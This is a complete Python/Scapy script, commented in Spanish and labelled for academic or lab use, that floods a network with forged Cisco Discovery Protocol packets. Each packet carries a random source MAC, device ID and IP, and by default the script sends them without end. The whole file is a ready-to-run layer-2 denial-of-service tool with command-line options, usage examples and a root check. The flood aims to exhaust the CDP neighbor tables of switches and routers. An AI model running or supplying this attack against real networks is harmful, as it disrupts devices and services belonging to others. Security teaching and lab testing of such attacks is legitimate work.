#!/usr/bin/env python3
# CDP Flooding Attack - Fines Academicos/Laboratorio
# Scapy version: 2.5.0

from scapy.all import *
from scapy.contrib.cdp import *
import random
import string
import time
import sys
import argparse  # Nuevo: para argumentos de linea de comandos

# ─────────────────────────────────────────
#  CONFIGURACION (valores por defecto)
# ─────────────────────────────────────────
INTERVAL    = 0.01          # Segundos entre paquetes (0.01 = 100 pkt/s)
PACKET_COUNT = 0            # 0 = infinito

# ─────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────
def random_mac():
    """Genera una MAC address aleatoria."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )

def random_ip():
    """Genera una IP address aleatoria."""
    return "%d.%d.%d.%d" % tuple(random.randint(1, 254) for _ in range(4))

def random_string(length=10):
    """Genera un string aleatorio para nombres de dispositivo."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# ─────────────────────────────────────────
#  CONSTRUCCION DEL PAQUETE CDP
# ─────────────────────────────────────────
def build_cdp_packet():
    """
    Construye un paquete CDP con valores aleatorios.
    CDP usa multicast MAC: 01:00:0c:cc:cc:cc
    EtherType SNAP con OUI Cisco.
    """
    src_mac      = random_mac()
    device_id    = random_string(12)
    platform     = random_string(8)
    software_ver = "Version " + random_string(6)
    ip_addr      = random_ip()

    # Capa Ethernet → destino CDP multicast
    eth = Ether(
        src=src_mac,
        dst="01:00:0c:cc:cc:cc"
    )

    # LLC + SNAP (requerido por CDP)
    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2000)   # OUI Cisco, PID CDP

    # Payload CDP
    cdp = CDPv2_HDR(
        vers=2,
        ttl=180
    ) / CDPMsgDeviceID(
        val=device_id
    ) / CDPMsgSoftwareVersion(
        val=software_ver
    ) / CDPMsgPlatform(
        val=platform
    ) / CDPMsgAddr(
        naddr=1,
        addr=[CDPAddrRecordIPv4(addr=ip_addr)]
    ) / CDPMsgPortID(
        iface="GigabitEthernet0/" + str(random.randint(0, 9))
    ) / CDPMsgCapabilities()

    return eth / llc / snap / cdp

# ─────────────────────────────────────────
#  FUNCION PRINCIPAL DE ATAQUE
# ─────────────────────────────────────────
def cdp_flood(interface, interval, count):
    print(f"""
╔══════════════════════════════════════════╗
║       CDP FLOOD                          ║
╠══════════════════════════════════════════╣
║  Interfaz  : {interface:<27} ║
║  Intervalo : {str(interval)+'s':<27} ║
║  Paquetes  : {'Infinito' if count == 0 else count:<27} ║
╚══════════════════════════════════════════╝
    """)

    sent    = 0
    start   = time.time()

    try:
        while True:
            pkt = build_cdp_packet()
            sendp(pkt, iface=interface, verbose=False)
            sent += 1

            # Stats cada 500 paquetes
            if sent % 500 == 0:
                elapsed = time.time() - start
                pps     = sent / elapsed
                print(f"[*] Enviados: {sent:>6} pkts | "
                      f"Tiempo: {elapsed:>6.1f}s | "
                      f"Rate: {pps:>7.1f} pkt/s")

            if count != 0 and sent >= count:
                break

            time.sleep(interval)

    except KeyboardInterrupt:
        elapsed = time.time() - start
        print(f"\n[!] Ataque detenido por el usuario.")
        print(f"[+] Total enviados : {sent} paquetes")
        print(f"[+] Tiempo total   : {elapsed:.2f}s")
        print(f"[+] Rate promedio  : {sent/elapsed:.1f} pkt/s")

# ─────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────
if __name__ == "__main__":
    # Configurar argumentos de linea de comandos
    parser = argparse.ArgumentParser(
        description='CDP Flooding Attack - Scapy 2.5.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 cdp_flood.py -i eth0
  sudo python3 cdp_flood.py -i eth0 --interval 0.05
  sudo python3 cdp_flood.py -i eth0 -c 1000
        """
    )
    
    parser.add_argument(
        '-i', '--interface',
        required=True,
        help='Interfaz de red (ej: eth0, wlan0)'
    )
    parser.add_argument(
        '--interval',
        type=float,
        default=INTERVAL,
        help=f'Intervalo entre paquetes en segundos (default: {INTERVAL})'
    )
    parser.add_argument(
        '-c', '--count',
        type=int,
        default=PACKET_COUNT,
        help=f'Cantidad de paquetes a enviar, 0 = infinito (default: {PACKET_COUNT})'
    )
    
    args = parser.parse_args()

    # Requiere privilegios root
    if os.getuid() != 0:
        print("[!] Ejecutar como root: sudo python3 cdp_flood.py -i <interfaz>")
        sys.exit(1)

    # Cargar modulo CDP de scapy
    load_contrib("cdp")

    # Ejecutar ataque con la interfaz proporcionada
    cdp_flood(args.interface, args.interval, args.count)
